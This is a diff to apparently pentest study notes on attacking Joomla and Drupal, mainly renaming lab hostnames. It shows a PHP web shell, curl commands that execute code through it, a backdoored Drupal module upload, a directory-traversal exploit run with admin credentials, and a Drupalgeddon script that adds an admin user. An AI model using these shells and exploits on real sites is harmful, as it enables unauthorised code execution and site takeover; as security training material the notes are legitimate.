@@ -78,7 +78,7 @@ eyewitness -h
 ```
 Take screenshots using Nmap XML output:
 ```
-eyewitness --web -x web_discovery.xml -d inlanefreight_eyewitness
+eyewitness --web -x web_discovery.xml -d company_eyewitness
 ```
 
 ## Aquatone
@@ -260,7 +260,7 @@ system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
 ```
 then we can execute code with a `curl` command:
 ```
-curl -s http://dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
+curl -s http://dev.company.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id
 ```
 Here we edited the `error.php` page.
 
@@ -275,7 +275,7 @@ Once we find the version, we can look for exploits in `exploit-db`.
 [CVE-2019-10945](https://www.cve.org/CVERecord?id=CVE-2019-10945) is a directory traversal and authenticated file deletion vulnerability. We can use [this](https://www.exploit-db.com/exploits/46710) exploit script to leverage the vulnerability and list the contents of the webroot and other directories. The python3 version of this same script can be found [here](https://github.com/dpgg101/CVE-2019-10945).
 
 ```
-python2.7 joomla_dir_trav.py --url "http://dev.inlanefreight.local/administrator/" --username admin --password admin --dir /
+python2.7 joomla_dir_trav.py --url "http://dev.company.local/administrator/" --username admin --password admin --dir /
 ```
 
 # Drupal
@@ -294,7 +294,7 @@ Drupal supports three types of users by default:
 
 ## Enumeration
 ```
-curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
+curl -s http://drupal-acc.company.local/CHANGELOG.txt | grep -m2 ""
 ```
 If we get 404 response, there might be a newer version of Drupal in use which blocks access to it.
 
@@ -353,7 +353,7 @@ The configuration above will apply rules for the / folder when we request a file
 mv shell.php .htaccess captcha
 tar cvf captcha.tar.gz captcha/
 ```
-Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.inlanefreight.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
+Assuming we have administrative access to the website, click on `Manage` and then `Extend` on the sidebar. Next, click on the `+ Install new module` button, and we will be taken to the install page, such as `http://drupal.company.local/admin/modules/install` Browse to the backdoored Captcha archive and click `Install`.
 
 Once the installation succeeds, browse to /modules/captcha/shell.php to execute commands.
 ```
@@ -364,7 +364,7 @@ curl -s drupal.company.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd
 This flaw can be exploited by leveraging a pre-authentication SQL injection which can be used to upload malicious code or add an admin user.
 We can add a new admin user with [this PoC script](https://www.exploit-db.com/exploits/34992). Once an admin user is added, we could log in and enable the PHP Filter module to achieve remote code execution.
 ```
-python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
+python2.7 drupalgeddon.py -t http://drupal-qa.company.local -u hacker -p pwnd
 ```
 We could also use the `exploit/multi/http/drupal_drupageddon` Metasploit module to exploit this.
 
